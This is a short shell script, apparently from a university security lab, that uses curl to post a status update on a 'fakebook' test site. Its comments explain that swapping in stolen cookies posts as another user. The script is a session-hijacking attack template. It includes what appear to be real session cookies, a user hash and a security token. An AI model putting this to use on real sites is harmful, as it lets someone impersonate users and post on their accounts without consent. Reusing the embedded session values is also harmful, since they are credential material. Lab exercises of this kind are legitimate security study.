# You can place your own status text in val[user_status] field in --data-raw.
# Replacing "Cookie" header with stolen cookies will place post for other user

curl 'http://boura.fit.cvut.cz/fakebook/static/ajax.php' \
  -H 'Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01' \
  -H 'Accept-Language: sk-SK,sk;q=0.9,cs;q=0.8,en-US;q=0.7,en;q=0.6' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: _ga_54R78HKGNS=GS1.1.1715962268.46.1.1715962435.0.0.0; _ga_VK215KDBLX=GS1.1.1696198210.1.1.1696198236.0.0.0; _ga_ZFQFJHB11G=GS1.1.1697533661.1.1.1697534196.0.0.0; _ga=GA1.1.671850115.1697533661; _ga_HGNKGCF00N=GS1.1.1707401940.8.0.1707401940.0.0.0; _ga_8X13DMVCT6=GS1.1.1707697342.3.1.1707697392.0.0.0; _ga_7SVXBV2B5R=GS1.1.1714475332.5.0.1714475332.0.0.0; _gcl_au=1.1.788427660.1710255332; _ga_ZPWF39NQCW=GS1.1.1710255332.1.1.1710255353.0.0.0; PHPSESSID=7s26kdmjognj3dcb68tv3m9qjf; cored889visit=1715006220; cored889user_id=12; cored889user_hash=17ef7c5e8e9d1b601f4adc073df09666170945cc0da0930315; cored889last_login=1716039324' \
  -H 'Origin: http://boura.fit.cvut.cz' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://boura.fit.cvut.cz/fakebook/index.php?do=/profile-47/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-raw '&core[ajax]=true&core[call]=user.updateStatus&core[security_token]=d4492e2099c22baa3d901a80a9722a5d&val[user_status]=Here%20you%20can%20place%20your%20text&val[group_id]=&val[action]=upload_photo_via_share&image[]=&val[link][url]=http%3A%2F%2F&val[status_info]=&val[connection][facebook]=0&val[connection][twitter]=0&val[privacy]=0&core[is_admincp]=0&core[is_user_profile]=1&core[profile_user_id]=47' \
  --insecure \
> /dev/null
